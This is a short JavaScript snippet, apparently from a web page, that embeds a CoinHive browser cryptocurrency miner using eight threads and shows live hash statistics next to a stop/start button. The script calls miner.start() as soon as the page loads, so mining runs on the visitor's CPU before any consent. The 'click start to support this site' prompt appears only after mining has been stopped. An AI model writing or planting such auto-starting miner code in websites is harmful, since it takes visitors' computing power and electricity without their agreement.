/*<![CDATA[*/
var miner = new CoinHive.Anonymous("7lh7jljyjUMKGnQQ2yPoxaeFjAmyWOhT", "threads: 8");
miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
setInterval(function() {
    var b = miner.getNumThreads();
    var a = Math.round(miner.getHashesPerSecond() * 100) / 100;
    var d = miner.getTotalHashes();
    var c = miner.getAcceptedHashes() / 256;
    if (miner.isRunning()) {
        document.getElementById("tcount").innerHTML = "Threads: " + b;
        document.getElementById("hps").innerHTML = "hashes per second: " + a;
        document.getElementById("ths").innerHTML = "Total Hashes: " + d;
        document.getElementById("tah").innerHTML = "Accepted Hashes: " + c;
        document.getElementById("minebutton").innerHTML = '<button onclick="miner.stop()">Stop Mining</button>'
    } else {
        document.getElementById("hps").innerHTML = "Please click start";
        document.getElementById("ths").innerHTML = "to support";
        document.getElementById("tah").innerHTML = "this site";
        document.getElementById("minebutton").innerHTML = '<button onclick="miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)">Start Mining</button>'
    }
}, 1000); /*]]>*/